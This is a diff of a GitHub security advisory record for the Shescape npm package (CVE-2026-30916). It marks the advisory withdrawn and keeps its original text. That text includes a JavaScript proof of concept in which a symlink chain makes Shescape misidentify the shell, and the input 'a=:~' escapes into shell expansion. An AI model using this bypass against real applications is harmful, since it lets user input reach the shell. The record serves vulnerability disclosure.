@@ -26,6 +26,9 @@
         "Url": "https://www.npmjs.com/package/shescape/v/2.1.9"
       },
       {
+        "Url": "https://github.com/github/advisory-database/pull/7206"
+      },
+      {
         "Url": "https://github.com/advisories/GHSA-6f6w-6j58-rq76"
       }
     ],
@@ -39,13 +42,13 @@
         "Value": "CVE-2026-30916"
       }
     ],
-    "Description": "### Impact\n\nThis impacts users of Shescape that configure their `shell` to point to a file on disk that is a link to a link. The precise result of being affected depends on the actual shell used and incorrect shell identified by Shescape.\n\nIn particular, an attacker may be able to bypass escaping for the shell being used. This can result, for example, in exposure of sensitive information, consider the following proof of concept (targeting Shescape v2):\n\n```javascript\nimport fs from \"node:fs\";\nimport { exec } from \"node:child_process\";\n\nimport { Shescape } from \"shescape\";\nimport which from \"which\";\n\n/* 1. Set up */\nconst shell = which.sync(\"bash\");\nconst linkToShell = \"./csh\";\nconst linkToLink = \"./link\";\n\nfs.rmSync(linkToLink, { force: true });\nfs.rmSync(linkToShell, { force: true });\nfs.symlinkSync(shell, linkToShell);\nfs.symlinkSync(linkToShell, linkToLink);\n\n/* 2. Misconfiguration */\nconst execOptions = {\n  shell: linkToLink,\n};\n\nconst shescape = new Shescape({\n  shell: execOptions.shell,\n});\n\n/* 3. Payload */\nconst userInput = \"a=:~\";\n\n/* 4. Attack example */\nexec(\n  `echo Hello ${shescape.escape(userInput)}`,\n  { shell: execOptions.shell },\n  (error, stdout) =\u003e {\n    fs.rmSync(linkToLink);\n    fs.rmSync(linkToShell);\n\n    if (error) {\n      console.error(`An error occurred: ${error}`);\n    } else {\n      console.log(stdout);\n      // Output:  \"Hello a=:/home/user\"\n    }\n  },\n);\n```\n\n### Patches\n\nThis problem has been patched in [v2.1.9](https://www.npmjs.com/package/shescape/v/2.1.9) which you can upgrade to now.\n\n### Workarounds\n\nIf upgrading is not an option, either avoid using a shell or make sure the shell path you use is not a link to a link.\n\n### References\n\n- Shescape Pull Request [#2388](https://github.com/ericcornelissen/shescape/pull/2388)\n- Shescape Release [v2.1.9](https://github.com/ericcornelissen/shescape/releases/tag/v2.1.9)\n\n### For more information\n\n- Comment on Pull Request [#2388](https://github.com/ericcornelissen/shescape/pull/2388)\n- Open an issue at \u003chttps://github.com/ericcornelissen/shescape/issues\u003e (New issue \u003e Question)",
+    "Description": "## Withdrawn Advisory\n\nThis advisory has been withdrawn because it falls outside the https://github.com/ericcornelissen/shescape/blob/a2544a1c78cae19d0e81a485b997bf0b0fcc2c12/SECURITY.md#threat-model. This link is maintained to preserve external references.\n\n## Original Description\n### Impact\n\nThis impacts users of Shescape that configure their `shell` to point to a file on disk that is a link to a link. The precise result of being affected depends on the actual shell used and incorrect shell identified by Shescape.\n\nIn particular, an attacker may be able to bypass escaping for the shell being used. This can result, for example, in exposure of sensitive information, consider the following proof of concept (targeting Shescape v2):\n\n```javascript\nimport fs from \"node:fs\";\nimport { exec } from \"node:child_process\";\n\nimport { Shescape } from \"shescape\";\nimport which from \"which\";\n\n/* 1. Set up */\nconst shell = which.sync(\"bash\");\nconst linkToShell = \"./csh\";\nconst linkToLink = \"./link\";\n\nfs.rmSync(linkToLink, { force: true });\nfs.rmSync(linkToShell, { force: true });\nfs.symlinkSync(shell, linkToShell);\nfs.symlinkSync(linkToShell, linkToLink);\n\n/* 2. Misconfiguration */\nconst execOptions = {\n  shell: linkToLink,\n};\n\nconst shescape = new Shescape({\n  shell: execOptions.shell,\n});\n\n/* 3. Payload */\nconst userInput = \"a=:~\";\n\n/* 4. Attack example */\nexec(\n  `echo Hello ${shescape.escape(userInput)}`,\n  { shell: execOptions.shell },\n  (error, stdout) =\u003e {\n    fs.rmSync(linkToLink);\n    fs.rmSync(linkToShell);\n\n    if (error) {\n      console.error(`An error occurred: ${error}`);\n    } else {\n      console.log(stdout);\n      // Output:  \"Hello a=:/home/user\"\n    }\n  },\n);\n```\n\n### Patches\n\nThis problem has been patched in [v2.1.9](https://www.npmjs.com/package/shescape/v/2.1.9) which you can upgrade to now.\n\n### Workarounds\n\nIf upgrading is not an option, either avoid using a shell or make sure the shell path you use is not a link to a link.\n\n### References\n\n- Shescape Pull Request [#2388](https://github.com/ericcornelissen/shescape/pull/2388)\n- Shescape Release [v2.1.9](https://github.com/ericcornelissen/shescape/releases/tag/v2.1.9)\n\n### For more information\n\n- Comment on Pull Request [#2388](https://github.com/ericcornelissen/shescape/pull/2388)\n- Open an issue at \u003chttps://github.com/ericcornelissen/shescape/issues\u003e (New issue \u003e Question)",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2026-03-07T02:31:58Z",
     "Severity": "LOW",
-    "Summary": "Shescape has possible misidentification of shell due to link chains",
-    "UpdatedAt": "2026-03-10T18:44:10Z",
-    "WithdrawnAt": "",
+    "Summary": "Withdrawn Advisory: Shescape has possible misidentification of shell due to link chains",
+    "UpdatedAt": "2026-03-20T19:53:42Z",
+    "WithdrawnAt": "2026-03-20T19:53:41Z",
     "CVSS": {
       "Score": 0,
       "VectorString": ""
